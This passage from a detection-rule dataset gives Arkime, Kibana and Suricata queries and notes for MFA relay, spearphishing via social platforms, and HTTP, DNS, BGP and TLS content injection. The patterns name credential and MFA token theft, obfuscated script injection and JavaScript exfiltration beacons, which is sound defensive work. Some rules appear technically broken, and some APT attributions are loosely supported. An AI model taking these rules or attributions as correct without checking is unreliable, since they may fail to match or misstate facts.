        arkime: "ip.src == $MPNET\n&& protocols == https\n&& http.method == POST\n&& host.http == [\"*login.microsoftonline.com*\", \"*accounts.google.com*\", \"*okta.com*\", \"*duo.com*\"]\n&& http.reqbody == [\"*otc=*\", \"*otp=*\", \"*token=*\", \"*code=*\", \"*mfa=*\", \"*totp=*\"]",
        kibana: "source.ip: $MPNET\nAND http.request.method: POST\nAND url.domain: (\n  *login.microsoftonline.com*\n  OR *accounts.google.com*\n  OR *okta.com* OR *duo.com*\n)\nAND http.request.body: (\n  *otc=* OR *otp=*\n  OR *token=* OR *code=*\n)",
        suricata: "alert http $HOME_NET any\n  -> $EXTERNAL_NET 443\n  (msg:\"TA0001 T1566.002 MFA token\n    POST to IdP possible OTP\n    relay\";\n  flow:established,to_server;\n  content:\"POST\"; http.method;\n  pcre:\"/(login\\.microsoftonline|\n    accounts\\.google|\n    okta\\.com|duo\\.com)/i\";\n  http.header;\n  pcre:\"/(otc|otp|token|code|\n    mfa|totp)=/i\";\n  http.request_body;\n  classtype:trojan-activity;\n  sid:9115607; rev:1;)",
        notes: "Cross-session timing (this session within N seconds of another session) is not expressible in Arkime baseline. Use the Suricata threshold rule below for time-windowed detection, or pivot to Kibana for session-timestamp aggregation. [AIR-GAP TRIPWIRE] This indicator detects outbound traffic from MPNET to off-MPNET infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Real-time MFA relay attacks prompt the victim to enter their OTP, which the adversary immediately submits to the legitimate IdP before it expires. The network signal is an MFA token POST to a legitimate IdP coming from an internal host in the immediate aftermath of a phishing link click. Timing correlation is key - an MFA POST within 60 seconds of a phishing-Referer-tagged HTTP request is a strong signal. Also watch for MFA fatigue attacks: repeated push notification approvals (POST to duo.com or okta.com) from a user who isn't actively logging in. Correlate with your IdP logs for the same user simultaneously authenticating from two geographic locations.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Uses real-time OTP relay in credential harvesting operations, prompting victims to enter MFA codes that are immediately relayed to Microsoft 365 authentication infrastructure." },
          { cls: "apt-mul", name: "Scattered Spider", note: "Conducts MFA fatigue and real-time relay attacks against technology and hospitality sector targets using both push notification fatigue and real-time OTP relay." },
          { cls: "apt-mul", name: "Multi", note: "Real-time MFA relay is documented in CISA and FBI advisories as an increasingly common technique used by both nation-state and criminal actors to bypass MFA." }
        ],
        cite: "MITRE ATT&CK T1566.002, T1621, CISA advisories"
      },
      {
        sub: "T1566.003 - Spearphishing via Service",
        indicator: "[OFF-NET TRIPWIRE] Internal host connecting to social platform / messaging API immediately after receiving DM",
        arkime: "ip.src == $MPNET\n&& protocols == https\n&& host.http == [\"*linkedin.com*\", \"*twitter.com*\", \"*x.com*\", \"*discord.com*\", \"*slack.com*\", \"*teams.microsoft.com*\", \"*telegram.org*\", \"*whatsapp.com*\"]\n&& http.method == GET\n&& http.uri == [\"*/redirect*\", \"*/url*\", \"*/link*\", \"*/click*\", \"*/track*\"]",
        kibana: "source.ip: $MPNET\nAND url.domain: (\n  *linkedin.com* OR *twitter.com*\n  OR *discord.com* OR *slack.com*\n  OR *teams.microsoft.com*\n  OR *telegram.org*\n)\nAND url.path: (\n  *redirect* OR */url*\n  OR */link* OR */click*\n  OR */track*\n)",
        suricata: "alert http $HOME_NET any\n  -> $EXTERNAL_NET any\n  (msg:\"TA0001 T1566.003 Social\n    platform redirect click\n    possible spearphishing\";\n  flow:established,to_server;\n  pcre:\"/Host:\\s*(linkedin|\n    twitter|x\\.com|discord|\n    slack|teams\\.microsoft|\n    telegram)\\.com/i\";\n  http.header;\n  pcre:\"/(redirect|\\/url|\n    \\/link|\\/click|\n    \\/track)/i\";\n  http.uri;\n  classtype:trojan-activity;\n  sid:9115608; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects connections to off-MPNet infrastructure that should be unreachable from an air-gapped environment. Any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Spearphishing via service uses trusted platforms (LinkedIn, Teams, Discord, Slack, Telegram) to deliver phishing links, bypassing email gateway controls entirely. The network signal is a redirect click through the platform's link tracking system - LinkedIn uses /redirect/, Twitter uses t.co, Discord uses discord.com/channels/ with external links, Teams uses teams.microsoft.com/l/. The redirect leads to the actual phishing payload. Detection requires SSL/TLS inspection at the proxy layer to see the URL paths. Correlate the redirect destination with newly registered domain indicators and threat intel. LinkedIn is the primary vector for Lazarus and Kimsuky social engineering.",
        apt: [
          { cls: "apt-kp", name: "Lazarus", note: "Uses LinkedIn extensively for Operation Dream Job social engineering, sending malicious links via DM that generate redirect-click network signals." },
          { cls: "apt-kp", name: "Kimsuky", note: "Uses social platform messaging to deliver phishing links to South Korean government and research targets, bypassing email gateway controls." },
          { cls: "apt-ir", name: "Charming Kitten", note: "Uses LinkedIn, Twitter, and Telegram to deliver phishing links to academic and policy sector targets." }
        ],
        cite: "MITRE ATT&CK T1566.003, industry reporting"
      }
    ]
  },
  {
    id: "T1659",
    name: "Content Injection",
    desc: "HTTP response injection · DNS injection · BGP hijack · TLS downgrade",
    rows: [
      {
        sub: "T1659 - HTTP Response Injection - Drive-by",
        indicator: "Injected JavaScript in HTTP response from legitimate site - on-path content modification",
        kibana: "destination.ip: $MPNET\nAND http.response.status_code: 200\nAND http.response.headers.content-type: (\n  *text/html*\n  OR *application/javascript*\n)\nAND http.response.body: (\n  *eval(atob(* OR *document.write*unescape*\n  OR *<script*src=*//*.tk*\n  OR *<script*src=*//*.xyz*\n)\nAND source.ip: $ALLOWED_DEFAULTS",
        suricata: "alert http $EXTERNAL_NET any\n  -> $HOME_NET any\n  (msg:\"TA0001 T1659 HTTP response\n    script injection in legitimate\n    site possible on-path mod\";\n  flow:established,from_server;\n  content:\"200\"; http.stat_code;\n  content:\"text/html\"; http.header;\n  file_data;\n  pcre:\"/<script[^>]+src\\s*=\\s*\n    [\\\"\\']https?:\\/\\/[a-z0-9\\-]+\\.\n    (tk|ml|ga|cf|xyz|top|club|\n    online|site|live|fun|pw|cc)/i\";\n  classtype:trojan-activity;\n  sid:9165901; rev:1;)",
        notes: "Adversaries with on-path access (compromised CDN, ISP-level injection, compromised proxy, hostile Wi-Fi) inject JavaScript into legitimate HTTP responses to deliver exploits or harvest credentials. The injected script typically loads from a newly registered or low-reputation domain. Detection requires inspecting response bodies - HTTPS prevents this except where you have TLS inspection, so this primarily catches HTTP traffic to legitimate sites that should be HTTPS. eval(atob()) and document.write(unescape()) are obfuscation patterns common in injected payloads. Compare response content against known-good baselines for high-value sites. Subresource Integrity (SRI) on legitimate sites prevents injection by verifying script hashes - alert when SRI is missing on critical pages.",
        apt: [
          { cls: "apt-mul", name: "Axiom", note: "On-path injection capability documented in attribution to Chinese intelligence operations against telecommunications providers and ISPs." },
          { cls: "apt-cn", name: "APT3", note: "Used compromised CDN infrastructure to inject content into responses served to victim browsers in watering hole operations." },
          { cls: "apt-ir", name: "APT33", note: "Documented capability for HTTP response injection in operations against energy sector targets." },
          { cls: "apt-mul", name: "Multi", note: "On-path content injection requires either ISP/CDN compromise, hostile network position (rogue AP), or BGP/DNS manipulation - all documented in CISA and NSA telecommunications security advisories." }
        ],
        cite: "MITRE ATT&CK T1659, T1557, CISA telecom advisories"
      },
      {
        sub: "T1659 - HTTP Response Injection - Drive-by",
        indicator: "HTTP Content-Length mismatch - injected payload exceeds declared length",
        kibana: "network.protocol: http\nAND _exists_:\n  http.response.headers.content_length\nAND http.response.body.bytes != http.response.headers.content_length",
        suricata: "alert http $EXTERNAL_NET any\n  -> $HOME_NET any\n  (msg:\"TA0001 T1659 HTTP Content\n    Length mismatch possible\n    response injection\";\n  flow:established,from_server;\n  content:\"Content-Length:\";\n  http.header;\n  byte_test:0,>,1024,\n    0,relative,string;\n  file_data;\n  byte_extract:0,0,actual_len;\n  classtype:trojan-activity;\n  sid:9165902; rev:1;)",
        notes: "Response injection often produces a length mismatch between the Content-Length header (set by the original server) and the actual delivered body (modified by the on-path injector). Most modern HTTP libraries handle Content-Length correctly so any mismatch is anomalous. Combined with smuggling-style discrepancies (TE.CL, CL.TE) this is a strong indicator of response tampering. Zeek http.log captures both the declared and actual response sizes - query for sessions where these diverge significantly (>100 bytes). Some legitimate causes exist (proxies that recompress, CDNs that modify), so baseline these and exclude known-good infrastructure before alerting.",
        apt: [
          { cls: "apt-mul", name: "Multi", note: "HTTP response tampering and content injection are documented techniques requiring on-path network position. The Content-Length mismatch detection method is documented in academic security research and Zeek detection cookbooks." }
        ],
        cite: "MITRE ATT&CK T1659, industry reporting"
      },
      {
        sub: "T1659 - HTTP Response Injection - Collection / C2",
        indicator: "Internal HTTP JavaScript beacon - east-west response injection for credential or data collection",
        kibana: "source.ip: $MPNET\nAND destination.ip: $MPNET\nAND network.protocol: http\nAND http.response.body: (\n  *new Image()*location*\n  OR *XMLHttpRequest*POST*\n  OR *fetch(*credentials*\n  OR *navigator.sendBeacon*\n)",
        suricata: "alert http $HOME_NET any\n  -> $HOME_NET any\n  (msg:\"TA0001 T1659 East-west HTTP\n    JS beacon possible internal\n    response injection\";\n  flow:established,from_server;\n  content:\"text/html\"; http.header;\n  file_data;\n  pcre:\"/(new\\s+Image\\(\\)\\.src\\s*=\\s*\n    [\\\"\\']?http|XMLHttpRequest.{0,50}\n    \\.(open|send)|fetch\\s*\\([\\\"\\'])/i\";\n  classtype:trojan-activity;\n  sid:9165903; rev:1;)",
        notes: "Internal-to-internal HTTP responses containing JavaScript beacon code suggest an internal application has been compromised to inject content into responses served to internal users. Common beacon patterns: new Image().src='http://...' (sends GET request via image load), XMLHttpRequest+POST (sends data via XHR), fetch() with credentials, navigator.sendBeacon() (designed for analytics, abused for exfil). The injection might come from a compromised internal web app, an ad/analytics tag in an internal CMS, or an attacker-modified template. Particularly important for internal SharePoint, Confluence, and CMS deployments which serve content to many users.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Has compromised internal web applications to inject content harvesting credentials and session data from internal users." },
          { cls: "apt-ru", name: "Sandworm", note: "Documented compromise of internal web infrastructure in operations against Ukrainian organizations, with content injection enabling credential collection." },
          { cls: "apt-mul", name: "Multi", note: "Internal web compromise leading to client-side content injection is documented in incident reports of multiple breaches involving compromised SharePoint, Confluence, and intranet CMS deployments." }
        ],
        cite: "MITRE ATT&CK T1659, T1505.003, industry reporting"
      },
      {
        sub: "T1659 - HTTP Response Injection - Collection / C2",
        indicator: "Third-party script tag from new / unauthorized source on internal application",
        kibana: "source.ip: $MPNET_WEB_APPS\nAND http.response.headers.content-type:\n  *text/html*\nAND http.response.body:\n  *<script src=*//*\nAND NOT http.response.body:\n  $APPROVED_SCRIPT_SOURCES",
        suricata: "alert http $MPNET_WEB_APPS any\n  -> $HOME_NET any\n  (msg:\"TA0001 T1659 New third-party\n    script source on internal app\n    possible injection\";\n  flow:established,from_server;\n  content:\"text/html\"; http.header;\n  file_data;\n  pcre:\"/<script[^>]+src\\s*=\\s*\n    [\\\"\\']https?:\\/\\/(?!yourcdn|\n    <YOUR_DOMAIN>)[^\\\"\\']+/i\";\n  classtype:trojan-activity;\n  sid:9165904; rev:1;)",
        notes: "Internal applications should serve scripts from a defined set of sources - your CDN, jsdelivr, unpkg, cloudflare, your own domain. New third-party script sources appearing on internal applications indicate injection - either via compromised application code, malicious CMS plugin, or modified template. Maintain $APPROVED_SCRIPT_SOURCES allowlist of legitimate script source domains. Implement Content Security Policy (CSP) headers on internal apps to enforce script source allowlisting at the browser level - CSP violations are also an excellent detection signal (CSP report-uri telemetry). Particularly relevant for WordPress, Drupal, and other CMS deployments where plugin compromise is common.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Has injected malicious script sources into compromised internal web applications for credential harvesting and session collection." },
          { cls: "apt-ru", name: "APT29", note: "Documented compromise of internal web infrastructure with script injection in SolarWinds-related operations." },
          { cls: "apt-mul", name: "Multi", note: "CMS compromise leading to script injection is the basis of magecart attacks against e-commerce and is documented in numerous PCI security advisories." }
        ],
        cite: "MITRE ATT&CK T1659, T1189, industry reporting"
      },
      {
        sub: "T1659 - DNS Response Injection",
        indicator: "DNS response with TTL=0 or anomalously low TTL - possible response injection",
        kibana: "network.protocol: dns\nAND dns.type: response\nAND dns.answers.ttl: [0 TO 30]\nAND NOT dns.answers.name: (\n  *cdn* OR *akamai*\n  OR *cloudflare* OR *fastly*\n  OR *amazonaws*\n)",
        suricata: "alert dns any 53\n  -> $HOME_NET any\n  (msg:\"TA0001 T1659 DNS response\n    anomalous TTL possible\n    injection\";\n  flow:stateless;\n  dns.response;\n  byte_test:4,<,30,\n    8,relative,big;\n  classtype:trojan-activity;\n  sid:9165905; rev:1;)",
        notes: "On-path DNS injection (DNS spoofing) typically uses very low TTLs (often 0) so the malicious response isn't cached long enough to be detected. Legitimate low TTLs occur on CDN endpoints (Akamai, Cloudflare, Fastly, AWS) which use DNS-based load balancing - these need to be excluded from the alert. Anomalously low TTLs on non-CDN domains, especially for high-value targets (banking sites, IdPs, internal infrastructure), suggest response injection. Combine with detection of duplicate DNS responses (the legitimate response arriving after the injected one). Pair with DNSSEC validation telemetry - DNS injection cannot survive DNSSEC validation, so signed-domain validation failures correlate strongly.",
        apt: [
          { cls: "apt-cn", name: "APT10", note: "Has demonstrated DNS-based on-path attack capability in operations against telecommunications and MSP infrastructure during Cloud Hopper." },
          { cls: "apt-ir", name: "APT33", note: "Has used DNS hijacking against energy sector targets, redirecting authentication traffic to credential harvesting infrastructure." },
          { cls: "apt-mul", name: "Multi", note: "DNS injection attacks (DNSpionage, Sea Turtle) are documented in CISA Emergency Directive 19-01 and FBI advisories on DNS infrastructure tampering." }
        ],
        cite: "MITRE ATT&CK T1659, T1557, CISA ED-19-01"
      },
      {
        sub: "T1659 - DNS Response Injection",
        indicator: "Duplicate DNS responses - race condition between legitimate and injected response",
        kibana: "network.protocol: dns\nAND dns.type: response\nAND _exists_: dns.id",
        suricata: "alert dns any 53\n  -> $HOME_NET any\n  (msg:\"TA0001 T1659 Duplicate DNS\n    response possible injection\n    race\";\n  flow:stateless;\n  dns.response;\n  threshold:type both,\n    track by_dst,\n    count 2, seconds 1;\n  classtype:trojan-activity;\n  sid:9165906; rev:1;)",
        notes: "DNS injection attacks race the legitimate DNS server - the adversary's spoofed response arrives at the victim resolver before the legitimate response. The legitimate response then arrives second and is silently discarded by the resolver. Network-level capture sees both responses with the same transaction ID, same query, but different answers. Zeek dns.log captures all DNS traffic including duplicates. Build detection that joins responses by transaction ID and resolver, alerting when the same query yields different answers within 1 second. This is a near-zero false positive indicator outside of legitimate DNS load balancers - and those should be in your $ALLOWED_DNS list.",
        apt: [
          { cls: "apt-cn", name: "APT10", note: "Documented DNS injection capability in MSP-targeted operations." },
          { cls: "apt-ru", name: "Sandworm", note: "Has used DNS-based attacks against Ukrainian infrastructure including DNS server compromise enabling on-path injection." },
          { cls: "apt-mul", name: "Multi", note: "DNS race-condition injection is documented in academic security research and CISA telecommunications security advisories." }
        ],
        cite: "MITRE ATT&CK T1659, industry reporting"
      },
      {
        sub: "T1659 - BGP Hijacking",
        indicator: "BGP UPDATE from unexpected peer - route hijack attempt",
        kibana: "network.protocol: bgp\nAND destination.port: 179\nAND bgp.message_type: \"UPDATE\"\nAND NOT bgp.peer_as: $KNOWN_PEER_ASNS\nAND bgp.nlri_prefix: $YOUR_PREFIXES",
        suricata: "alert tcp $EXTERNAL_NET any\n  -> $BGP_PEERS 179\n  (msg:\"TA0001 T1659 BGP UPDATE\n    from unexpected peer\n    possible hijack\";\n  flow:established,to_server;\n  content:\"|02|\"; offset:18;\n  depth:1;\n  classtype:trojan-activity;\n  sid:9165907; rev:1;)",
        notes: "BGP hijacking redirects internet traffic for entire IP prefixes through adversary infrastructure - historically used by nation-state actors for traffic interception, surveillance, and on-path content injection. Detection: BGP UPDATE messages (message type 2 = '|02|' at offset 18) from peers not in your known peer ASN list, especially announcing your own prefixes. Most enterprises won't see BGP at the network capture level - this is primarily for ISPs, hosting providers, and large enterprises with their own ASNs. Use BGPmon, RIPE RIS, and BGPstream for external monitoring of your prefix announcements. Detection of your prefixes being announced from unexpected ASNs is the primary indicator of an active hijack against you.",
        apt: [
          { cls: "apt-cn", name: "APT10", note: "BGP hijacking incidents have been attributed to Chinese state-affiliated actors (China Telecom AS4134) including the 2010 incident where 15% of internet traffic was routed through Chinese infrastructure for 18 minutes." },
          { cls: "apt-ru", name: "Sandworm", note: "Capability for routing-layer attacks documented in operations against telecommunications infrastructure." },
          { cls: "apt-cn", name: "Volt Typhoon", note: "Has demonstrated network infrastructure compromise capability that could enable BGP-level attacks against US critical infrastructure." },
          { cls: "apt-mul", name: "Multi", note: "BGP hijacks are documented in numerous incidents reported by Cloudflare, RIPE, and academic researchers - both nation-state operations and criminal cryptocurrency theft." }
        ],
        cite: "MITRE ATT&CK T1659, BGPmon advisories, academic research"
      },
      {
        sub: "T1659 - TLS Downgrade / HSTS Bypass",
        indicator: "[OFF-NET TRIPWIRE] TLS handshake using deprecated version - SSLv3 / TLSv1.0 / TLSv1.1 from internal client",
        arkime: "ip.src == $MPNET\n&& protocols == tls\n&& tls.version == [SSLv3, TLSv1.0, TLSv1.1]\n&& port.dst == 443\n&& ip.dst != $LEGACY_INTERNAL",
        kibana: "source.ip: $MPNET\nAND tls.version: (\n  \"SSLv3\" OR \"TLS 1.0\"\n  OR \"TLS 1.1\"\n)\nAND destination.port: 443\nAND NOT destination.ip:\n  $LEGACY_INTERNAL",
        suricata: "alert tls $HOME_NET any\n  -> $EXTERNAL_NET any\n  (msg:\"TA0001 T1659 TLS handshake\n    using deprecated version\n    possible downgrade attack\";\n  flow:established,to_server;\n  content:\"|16 03|\"; depth:2;\n  content:\"|03 00|\"; offset:9;\n  depth:2;\n  classtype:policy-violation;\n  sid:9165908; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects connections to off-MPNet infrastructure that should be unreachable from an air-gapped environment. Any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. TLS downgrade attacks force a connection to use deprecated TLS versions (SSLv3/POODLE, TLSv1.0/BEAST, TLSv1.1) which have known cryptographic weaknesses. Modern browsers and OS reject these by default - any internal client negotiating these versions to external servers indicates either a downgrade attack, a misconfigured client, or legacy software that needs upgrading. Build a $LEGACY_INTERNAL allowlist for known-legacy internal services that genuinely require old TLS, and alert on everything else. Zeek ssl.log captures TLS version explicitly. For external destinations, modern services (Google, Microsoft, AWS) all support TLS 1.3 - any negotiation to TLS 1.0/1.1 with these services is highly suspicious.",
        apt: [
          { cls: "apt-ru", name: "Midnight Blizzard", note: "Documented use of TLS downgrade and protocol manipulation in advanced operations against Microsoft 365 and Azure infrastructure." },
          { cls: "apt-mul", name: "Scattered Spider", note: "Uses TLS protocol manipulation as part of AiTM proxy infrastructure to maintain compatibility with vulnerable client implementations." },
          { cls: "apt-ir", name: "Charming Kitten", note: "Has used TLS downgrade against academic and NGO sector targets for traffic interception." },
          { cls: "apt-mul", name: "Multi", note: "TLS downgrade attacks (POODLE, BEAST, FREAK, Logjam) are documented in academic cryptographic research and remain exploitable against unpatched legacy systems." }
        ],
        cite: "MITRE ATT&CK T1659, T1557, academic cryptographic research"
      },
      {
        sub: "T1659 - TLS Downgrade / HSTS Bypass",
        indicator: "[OFF-NET TRIPWIRE] HTTP request to HSTS-listed domain - bypass attempt or initial connection injection",
        arkime: "ip.src == $MPNET\n&& protocols == http\n&& http.method == GET\n&& host.http == $EXTERNAL_HSTS_DOMAINS\n&& port.dst == 80",
        kibana: "source.ip: $MPNET\nAND http.request.method: GET\nAND url.domain: $EXTERNAL_HSTS_DOMAINS\nAND destination.port: 80",
        suricata: "alert http $HOME_NET any\n  -> $EXTERNAL_NET 80\n  (msg:\"TA0001 T1659 HTTP probe\n    to HSTS-listed domain bypass\n    attempt\";\n  flow:established,to_server;\n  content:\"GET\"; http.method;\n  pcre:\"/Host:\\s*(www\\.)?(google|\n    microsoft|github|cloudflare|\n    facebook|amazon|apple)\\.com/i\";\n  http.header;\n  classtype:policy-violation;\n  sid:9165909; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from MPNET to off-MPNET infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. HSTS preload list domains (google.com, microsoft.com, github.com, cloudflare.com, facebook.com, amazon.com, apple.com, and thousands of others) are hardcoded in modern browsers as HTTPS-only - browsers will refuse to make HTTP connections to these domains. An HTTP request to an HSTS preload domain from a modern browser indicates either a non-browser client (curl/wget/python script - possibly malicious), an outdated browser without the HSTS preload list, or a sophisticated SSL stripping attack with a custom client. Maintain $EXTERNAL_HSTS_DOMAINS list synced from the Chromium HSTS preload list. The HTTP probe itself is suspicious - successful exploitation would produce subsequent HTTPS to a different IP than the legitimate domain.",
        apt: [
          { cls: "apt-mul", name: "Multi", note: "SSL stripping attacks (sslstrip, mitm6) are documented in academic security research and offensive security tooling. HSTS preload list adoption has dramatically reduced SSL stripping effectiveness against major sites, but legacy clients and non-preloaded domains remain vulnerable." }
        ],
        cite: "MITRE ATT&CK T1659, T1557, Chromium HSTS preload list"
      }
    ]
  }
];
